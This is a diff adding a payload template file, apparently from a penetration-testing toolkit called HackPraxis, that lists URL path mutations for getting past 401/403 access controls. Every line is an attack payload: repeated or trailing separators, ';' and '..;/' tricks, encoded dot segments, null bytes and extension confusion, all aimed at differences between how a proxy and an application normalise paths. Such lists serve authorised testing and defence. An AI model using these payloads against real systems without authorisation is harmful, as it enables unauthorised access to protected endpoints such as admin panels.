@@ -1,0 +1,52 @@
+# HackPraxis 401/403 path & encoding bypass templates
+# Tokens:  {P} = full path of your target (e.g. /admin)   {S} = last segment (e.g. admin)
+# Each line becomes a mutated URL on the same host, requested with a plain GET.
+# Idea: proxy and application normalise paths differently, so one of these may
+# reach the protected handler while the front-end still thinks it's allowed.
+# Sources: HackTricks, PortSwigger, PayloadsAllTheThings.
+#
+# --- trailing / repeated separators ---
+{P}/
+{P}//
+{P}/.
+{P}/./
+{P}/..
+{P}/..;/
+{P}..;/
+{P};/
+{P}/;/
+{P}/.;/
+//{P}//
+/./{P}
+/.{P}
+#
+# --- whitespace / terminators appended to the path ---
+{P}%20
+{P}%09
+{P}%00
+{P}.
+{P}..
+{P}?
+{P}#
+{P}%23
+#
+# --- dot-segment encodings in front of the segment ---
+/%2e/{S}
+/%2e%2e/{S}
+{P}/%2e
+{P}/%2e%2e
+{P}/%2f
+{P}%2f
+{P}..%2f
+#
+# --- extension / suffix confusion (Spring & friends) ---
+{P}.json
+{P}.html
+{P}.css
+{P}~
+{P}%2500
+#
+# --- wrapping the segment ---
+/{S}/.
+/{S}/..;/
+/./{S}/./
